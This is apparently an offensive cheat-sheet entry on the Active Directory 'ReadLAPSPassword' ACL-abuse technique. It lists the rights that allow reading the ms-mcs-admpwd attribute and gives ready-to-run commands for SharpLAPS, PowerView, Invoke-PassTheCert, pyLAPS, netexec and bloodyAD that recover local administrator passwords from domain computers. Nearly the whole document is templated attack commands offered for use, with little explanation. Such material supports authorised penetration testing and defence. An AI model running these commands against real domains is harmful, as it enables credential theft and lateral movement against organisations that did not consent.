---
technique: ReadLAPSPassword
category: acl-abuse
ace: GenericAll, AllExtendedRights, GetChanges+GetChangesInFilteredSet, GetChanges+GetChangesAll
targets: Computer
protocols: LDAP, LDAPS
remote_capable: true
tags: acl-abuse dacl ad laps local-admin ldap credential-access
---

# ReadLAPSPassword

When a controlled object holds `GenericAll`, `AllExtendedRights`, or the combination of `GetChanges` with `GetChangesInFilteredSet` or `GetChangesAll` over a LAPS-managed computer object, the attacker can read the `ms-mcs-admpwd` attribute to recover the local administrator's randomly-generated password. This gives immediate local admin access to the target machine.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control, includes reading LAPS password attribute |
| AllExtendedRights | All extended rights, including LAPS password read |
| GetChanges + GetChangesInFilteredSet | Confidential attribute replication right, sufficient for LAPS via DirSync |
| GetChanges + GetChangesAll | Standard replication rights, also covers LAPS attribute access |

## Windows

The Active Directory module, PowerView, and SharpLAPS all read LAPS attributes directly.

### Get-ADComputer

#powershell #rsat

Read LAPS passwords for all managed computers using the RSAT Active Directory module.

```powershell title:"Read LAPS passwords via RSAT AD module"
Get-ADComputer -Filter {ms-mcs-admpwdexpirationtime -like '*'} -Properties 'ms-mcs-admpwd', 'ms-mcs-admpwdexpirationtime'
```
<!-- cheat -->

### Get-DomainComputer

#powershell #powerview

Read the LAPS password for a specific computer using PowerView.

```powershell title:"Read LAPS password for target computer via PowerView"
Get-DomainComputer "$target_computer" -Properties 'cn', 'ms-mcs-admpwd', 'ms-mcs-admpwdexpirationtime'
```
<!-- cheat
var target_computer
-->

### SharpLAPS

#csharp #binary

Read LAPS passwords using the SharpLAPS binary.

```powershell title:"Read LAPS password with SharpLAPS"
.\SharpLAPS.exe /user:"$domain\$user" /pass:"$pass" /host:"$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### Step 1: Import module (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 2: Get LDAP connection (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 3: Read LAPS passwords over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Read LAPS passwords over LDAPS using a certificate via Invoke-PassTheCert.

```powershell title:"Read LAPS passwords over LDAPS using certificate"
Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $ldap -Enum 'LAPS' -SearchBase "$domain_dn"
```
<!-- cheat
var domain_dn
-->

## Linux

pyLAPS, netexec, and bloodyAD all retrieve LAPS attributes over LDAP.

### pyLAPS

#ldap #password #python

Read LAPS passwords for all managed computers using pyLAPS.

```sh title:"Read LAPS passwords via pyLAPS"
pyLAPS.py --action get -d "$domain" -u "$user" -p "$pass" --dc-ip "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### netexec

#ldap #multi-auth

Read LAPS passwords using the netexec LAPS module with optional computer filter.

```sh title:"Read LAPS passwords via netexec laps module"
nxc ldap "$rhost_ip" -d "$domain" -u "$user" $auth_flags --module laps -O computer="$target_computer"
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var target_computer
-->

### bloodyAD

#ldap #multi-auth

Read LAPS passwords by searching for objects with the expiration time attribute set using bloodyAD.

```sh title:"Read LAPS passwords via bloodyAD LDAP search"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
-->
